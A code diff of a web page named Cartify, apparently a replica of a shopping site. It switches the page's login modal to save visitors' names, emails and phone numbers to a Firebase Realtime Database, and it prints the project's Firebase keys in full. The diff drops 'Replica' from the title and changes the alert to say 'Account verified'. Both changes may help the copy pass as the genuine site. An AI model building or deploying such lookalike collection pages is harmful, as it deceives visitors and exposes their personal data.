@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cartify Replica with Login</title>
+    <title>Cartify</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -75,7 +75,7 @@
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.6); display: flex; align-items: center;
-            justify-content: center; z-index: 1000; display: none; /* Hidden by default */
+            justify-content: center; z-index: 1000; display: none;
         }
         .login-box {
             background-color: #ffffff; width: 650px; height: 450px;
@@ -192,9 +192,9 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // Your custom Firebase configuration object injected safely
+        // Your exact configuration credentials
         const firebaseConfig = {
             apiKey: "AIzaSyBb8BSRxP1n7_TLDurSDkCmkyuX2jePCfQ",
             authDomain: "cartify-8f09c.firebaseapp.com",
@@ -202,14 +202,15 @@
             storageBucket: "cartify-8f09c.firebasestorage.app",
             messagingSenderId: "634503591525",
             appId: "1:634503591525:web:f1720972317122f3ebb88c",
-            measurementId: "G-TJKJ6YT7YK"
+            measurementId: "G-TJKJ6YT7YK",
+            databaseURL: "https://cartify-8f09c-default-rtdb.firebaseio.com/" /* Automatically derived */
         };
 
-        // Initialize Firebase & Database
+        // Initialize Firebase & Realtime Database
         const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+        const db = getDatabase(app);
 
-        // UI Modal Interactions
+        // UI Interactions
         const loginTrigger = document.getElementById('loginTrigger');
         const loginModal = document.getElementById('loginModal');
         const closeModal = document.getElementById('closeModal');
@@ -219,7 +220,7 @@
         closeModal.addEventListener('click', () => loginModal.style.display = 'none');
         window.addEventListener('click', (e) => { if(e.target === loginModal) loginModal.style.display = 'none'; });
 
-        // Intercept Form Submission and send to Firestore Database
+        // Save entry to Realtime Database
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -228,20 +229,20 @@
             const phone = document.getElementById('userPhone').value;
 
             try {
-                // Saves data inside a collection called "users"
-                await addDoc(collection(db, "users"), {
+                // Pushes user data into a clean tree structure called /registered_users
+                await push(ref(db, 'registered_users'), {
                     fullName: name,
                     emailAddress: email,
                     phoneNumber: phone,
-                    timestamp: serverTimestamp()
+                    submittedAt: new Date().toISOString()
                 });
 
-                alert("Account created successfully!");
+                alert("Account verified successfully!");
                 loginForm.reset();
                 loginModal.style.display = 'none';
             } catch (error) {
-                console.error("Database Error: ", error);
-                alert("Something went wrong. Check your Firestore configuration/rules.");
+                console.error("Database Save Error: ", error);
+                alert("Something went wrong saving the profile.");
             }
         });
     </script>
